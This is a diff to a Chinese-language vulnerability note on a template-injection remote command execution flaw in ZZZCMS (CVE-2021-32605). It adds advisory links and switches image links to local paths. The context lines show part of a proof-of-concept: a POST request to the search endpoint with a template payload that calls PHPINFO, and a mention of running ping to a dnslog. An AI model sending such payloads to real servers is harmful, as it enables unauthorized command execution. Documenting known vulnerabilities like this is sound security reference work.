@@ -4,6 +4,11 @@
 
 ZZZCMS parserSearch 存在模板注入导致远程命令执行漏洞
 
+参考链接：
+
+- https://srcincite.io/advisories/src-2021-0015/
+- https://nvd.nist.gov/vuln/detail/CVE-2021-32605
+
 ## 漏洞影响 
 
 ```
@@ -20,7 +25,7 @@ app="zzzcms"
 
 发送如下请求包命令执行
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170904549.png)
+![](./images/202202170904549.png)
 
 ```plain
 POST /?location=search HTTP/1.1
@@ -42,4 +47,4 @@ keys={if:=PHPINFO()}{end if}
 
 执行 ping dnslog
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202170904912.png)
+![](./images/202202170904912.png)
